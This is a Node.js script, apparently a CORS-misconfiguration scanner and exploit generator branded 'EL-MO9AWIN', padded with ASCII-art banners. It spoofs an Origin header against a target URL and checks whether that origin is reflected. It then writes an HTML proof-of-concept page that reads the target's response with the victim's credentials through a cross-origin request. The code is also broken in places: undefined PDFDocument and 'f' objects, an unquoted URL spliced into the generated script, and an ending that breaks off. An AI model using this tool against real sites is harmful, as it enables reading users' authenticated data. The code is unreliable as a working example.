//Dependencies
const Axios = require("axios")
const fs = require('fs/promises');

//Variables
const Self_Args = process.argv.slice(2)
const args = process.argv.slice(2);


const URL = args[0];
const INJECTION = args[1];
const FILE = args[2];
const PDF = args[3];

//Main
if(!Self_Args.length){

	 console.log('\n\n','\x1b[31m',
 ` 


    ⠀⠀⠀⠀⢀⣤⣴⣿⣶⣤⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀EL-MO9AWIN
⠀⠀⠀⠀⠀⠀⠀⢀⡟⢫⣩⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⡶⡆⢻⡿⠉⢹⡷⠶⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠸⢤⠀⠈⡧⠀⢈⡷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⠲⢾⣇⡴⠋⠀⠛⠢⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢾⠏⠀⠀⠀⠒⢦⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣴⢣⠋⡤⢲⠄⠀⠀⠀⠣⣸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⡷⠁⠀⠛⠋⢸⠀⠀⠀⠀⠀⢇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠰⢷⣤⣄⡀⠀⠀⡿⠁⠀⠀⠀⢠⠇⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣍⣛⠷⣶⣧⣀⠀⡀⠀⡼⠀⠀⠀⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⠙⠛⢿⣿⣿⣿⣷⣤⠇⠀⠀⠀⠀⠀⠀⠀⠹⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣮⠐⠚⠛⠛⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣶⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢟⣉⡉⠁⠐⢺⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⡟⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⠀⠉⠁⠒⠸⠀⠀⠀⠀⠀⠀⣠⡾⢿⣯⡁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡟⠀⡀⠀⠀⠰⣄⠀⠀⠀⢀⣴⠋⠀⠀⠉⠛⢷⣤⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⠁⡆⢣⠀⠀⠀⠙⣷⣄⢀⣿⣿⡄⠀⠀⠀⠀⠀⠉⠛⢷⣄⡀⠀
⠀⠀⠀⠀⠀⢸⡆⢰⠈⡆⠀⠀⠀⠈⠛⢿⣿⡇⢧⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠆
⠀⠀⠀⠀⠀⢸⡇⠸⡀⢱⡀⠀⠀⠀⠀⠀⠈⢀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡇⠀⡇⠀⣇⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⣧⠀⢹⡀⢸⠀⠀⢠⠀⠀⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⠀⠈⡇⠸⡇⠀⠀⢃⠀⠀⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⠀⠀⢹⡀⢻⠀⠀⠈⡆⠀⠀⠀⠀⠸⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠸⡇⠀⠘⡇⠘⡆⠀⠀⢰⡀⠀⠀⠀⠀⢹⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣇⠀⠀⢻⠀⢣⠀⠀⠀⢷⠀⠀⠀⠀⣠⡿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣻⠀⠀⣸⡇⠘⠀⠀⠀⢘⣧⠤⢴⡞⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠉⣩⠽⡗⠒⢒⣖⢒⠟⡇⠉⣉⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠠⣞⣉⣯⣐⣳⣪⣵⣋⣻⣒⣹⣅⣠⣼⡆⠀⠀⠀

	`,'\x1b[0m');

    console.log("node CORS-POC.js <url> <injection> <poc-file> <pdf-report>")
    process.exit()
}

void async function Main(){
    try{
        const response = await Axios({
            method: "GET",
            url: Self_Args[0],
            headers: {
                origin: INJECTION
            }
        })

	async function poc() {
  	try {
    	const content =  "<!DOCTYPE html><html><body><center><h2>CORS POC EXPLOIT</h2><h3>SEC</h3><div id='demo'><button type='button' onclick='cors()'>Exploit</button></div><script>function cors() {var xhttp = new XMLHttpRequest();xhttp.onreadystatechange = function() {if (this.readyState == 4 && this.status == 200) {document.getElementById('demo').innerHTML = alert(this.responseText);}};xhttp.open('GET',"+URL+", true);xhttp.withCredentials = true;xhttp.send();}</script></body></html>";

    	await fs.writeFile(FILE, content);
  	} catch (err) {
    	console.log(err);
  		}
	}
        if(JSON.stringify(response.headers).indexOf(INJECTION) != -1 ){ 
		console.log('\n\n','\x1b[31m',
 ` 
             ⢠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡟⠋⣍⣩⣽⣿⣿⣿⣿⣿⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠀⣘⠙⣿⣿⣿⡿⠟⢻⣿⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠛⠿⠅⠙⣿⠋⠀⠀⢸⡿⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣇⡀⠀⠀⠀⣿⡆⠀⠀⠘⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣫⠃⠄⢀⣤⠁⠀⠀⣴⡿⠋⣹⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⣷⣾⣿⢀⣴⠟⠋⠀⠀⠉⠙⢷⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀NEVER GIVE UP⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡾⠋⠀⠀⠀⢀⣀⣀⡀⠘⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⣱⡟⠁⠀⠀⠀⠀⠀⠀⠉⢿⡄⠈⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡟⢱⡏⢀⣠⠤⣄⠀⠀⠀⠀⠀⠈⠻⣄⠈⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀DREAM 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⣠⠋⠀⢸⣇⣀⡟⢀⡄⠀⠀⠀⠀⠀⠈⠣⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡿⡜⠁⠀⠀⠈⠉⠉⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀CODE
⢀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡟⠁⠀⠀⠀⠀⠀⠀⢠⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠛⠿⣿⣷⣦⣤⣀⠀⠀⠀⢸⣿⠁⠀⠀⠀⠀⠀⠀⠀⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     HACK⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⡙⠻⢿⣿⣶⣦⣼⡏⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠰⣿⣷⣶⣤⣝⣛⣿⣿⣿⣦⣄⣠⡄⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠉⠛⠿⢿⣿⣶⣯⣿⣿⣿⣿⣦⣤⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀CORS FOUND ⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡟⢉⣛⣻⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀@EL-MO9AWIN
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠈⠉⠀⠀⠈⠉⠉⡝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠷⠒⠛⠓⠓⠒⠲⠦⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣼⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡶⠶⣦⣤⣀⠀⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣇⠀⠀⠀⠈⠉⠛⠶⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣯⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⡄⠀⠀⠀⠀⠰⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠙⠻⢿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠁⠀⢧⠀⠀⠀⠀⠀⠹⣷⣄⠀⠀⠀⠀⠀⣠⣾⣿⠁⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⣿⠇⠀⡆⠸⡆⠀⠀⠀⠀⠀⠙⢿⣧⡀⠀⠀⢰⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣷⣤⣀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⣧⠀⢹⠀⠀⠀⠀⠀⠀⠈⢿⣿⣦⣤⣾⣿⣿⡿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⣶⣄⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢹⠀⠈⣇⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⡆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡇⠀⠸⡆⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠋⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⣇⠀⠀⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠀⠀⢻⡄⠀⢸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣞⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⢸⣇⠀⠈⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⠀⢿⠀⠀⢸⡇⠀⠀⠀⢰⡀⠀⠀⠀⠀⠀⠀⠘⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢸⣧⠀⠸⣿⠀⠀⠀⠀⢷⠀⠀⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠀⠀⠀⣿⡀⠀⣿⡄⠀⠀⠀⠀⣇⠀⠀⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⠀⢹⣇⠀⢹⣇⠀⠀⠀⠀⠸⡆⠀⠀⠀⠀⠀⠀⠀⠈⢿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⣿⡄⠀⢿⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡆⠀⠀⠀⢹⣇⠀⢸⡇⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⠀⠘⣿⠀⠀⣇⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⢹⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⢻⡇⠀⠘⡆⠀⠀⠀⠀⠀⢿⣆⠀⠀⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⢸⣿⠀⠀⢧⠀⠀⠀⠀⠀⠘⣿⡄⠀⠀⣀⣴⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣀⣀⣠⣤⣼⣿⡀⠀⠀⠀⠀⠀⠀⢀⣠⣾⡟⣉⣉⣩⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⢁⣠⠴⣿⠛⠛⠛⠛⣿⡛⠛⢻⠟⢻⠉⠀⠀⢀⣸⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⡤⢶⡯⢥⣀⣹⣄⣠⠤⢞⣩⠷⣶⣉⣀⣨⣷⠶⠚⠉⠁⣹⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣧⣤⡤⢽⣧⣤⠤⢿⢤⣴⣿⣤⣤⣤⣿⣤⣤⣼⡦⠤⠴⡶⣿⡇⠀⠀⠀⠀⠀⠀⠀


`,'\x1b[0m');

	console.log(" %s VULN TO CORS.",URL) 

	const notifier = require('node-notifier');

        const MSG = "POC GENERATED \n EL-MO9AWIN ";
    // String
        var alert = "CORS ON : " + URL +" \n" + MSG;
    // Object
        notifier.notify({
                title: '[CORS-POC]',
                message: alert,
        });

	poc();
	 
        let pdfDoc = new PDFDocument;
        pdfDoc.pipe(f.createWriteStream(PDF));
        

        pdfDoc.font('Times-Roman').fontSize(20).fillColor('red').text("DZ-LAB REPORT-POC AUTOMATED");

        let myArrayOfItems = ['ENIMIRATE WEBSITE', 'MAP STRUCTURE', 'GRAB HEADERS', 'DETECT MISSING HEADERS','MAKE A REQUEST','CHECK FOR RESPONSE','NOTIFY ABOUT DISCLURE'];

        pdfDoc.list(myArrayOfItems);
    // Move down a bit to provide space between lists
        pdfDoc.moveDown(0.5);
        
        pdfDoc.font('Times-Roman').fontSize(10).fillColor('red').text("\n\nREPORT:");
	const BUG = "CORS INJECTION";
        pdfDoc.font('Times-Roman').fontSize(10).fillColor('red').text("\n\nBUG TYPE:"+BUG);
        pdfDoc.font('Times-Roman').fontSize(2).fillColor('blue').text("\n\nRESPONSE:\n\n"+response.text);
	pdfDoc.font('Times-Roman').fontSize(2).fillColor('blue').text("\n\nRESPONSE:\n\n"+response.headers);
        pdfDoc.font('Times-Roman').fontSize(5).fillColor('blue').text("\n\nPOC", { link: URL, underline: true });
        pdfDoc.font('Times-Roman').fontSize(5).fillColor('green').text("\n\nWE ARE DZ-LAB @EL-MO9AWIN");
        pdfDoc.end();



	}
	else {
	   console.log('\n\n','\x1b[31m',
 ` 
             ⢠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡟⠋⣍⣩⣽⣿⣿⣿⣿⣿⡍⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠀⣘⠙⣿⣿⣿⡿⠟⢻⣿⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠛⠿⠅⠙⣿⠋⠀⠀⢸⡿⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣇⡀⠀⠀⠀⣿⡆⠀⠀⠘⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣫⠃⠄⢀⣤⠁⠀⠀⣴⡿⠋⣹⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠻⣷⣾⣿⢀⣴⠟⠋⠀⠀⠉⠙⢷⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀NEVER GIVE UP⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡾⠋⠀⠀⠀⢀⣀⣀⡀⠘⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⣱⡟⠁⠀⠀⠀⠀⠀⠀⠉⢿⡄⠈⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡟⢱⡏⢀⣠⠤⣄⠀⠀⠀⠀⠀⠈⠻⣄⠈⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀DREAM 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⣠⠋⠀⢸⣇⣀⡟⢀⡄⠀⠀⠀⠀⠀⠈⠣⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⡿⡜⠁⠀⠀⠈⠉⠉⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀CODE
⢀⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡟⠁⠀⠀⠀⠀⠀⠀⢠⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠛⠿⣿⣷⣦⣤⣀⠀⠀⠀⢸⣿⠁⠀⠀⠀⠀⠀⠀⠀⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀     HACK⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⡙⠻⢿⣿⣶⣦⣼⡏⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠰⣿⣷⣶⣤⣝⣛⣿⣿⣿⣦⣄⣠⡄⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠉⠛⠿⢿⣿⣶⣯⣿⣿⣿⣿⣦⣤⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡟⢉⣛⣻⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠈⠉⠀⠀⠈⠉⠉⡝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠷⠒⠛⠓⠓⠒⠲⠦⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣼⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡶⠶⣦⣤⣀⠀⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣇⠀⠀⠀⠈⠉⠛⠶⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣯⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡟⠀⡄⠀⠀⠀⠀⠰⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⠀⠙⠻⢿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠁⠀⢧⠀⠀⠀⠀⠀⠹⣷⣄⠀⠀⠀⠀⠀⣠⣾⣿⠁⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⣿⠇⠀⡆⠸⡆⠀⠀⠀⠀⠀⠙⢿⣧⡀⠀⠀⢰⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣷⣤⣀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⣧⠀⢹⠀⠀⠀⠀⠀⠀⠈⢿⣿⣦⣤⣾⣿⣿⡿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⣶⣄⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⢹⠀⠈⣇⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⠀⢻⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⡆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡇⠀⠸⡆⠀⢻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠋⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⣇⠀⠀⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠀⠀⢻⡄⠀⢸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣞⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
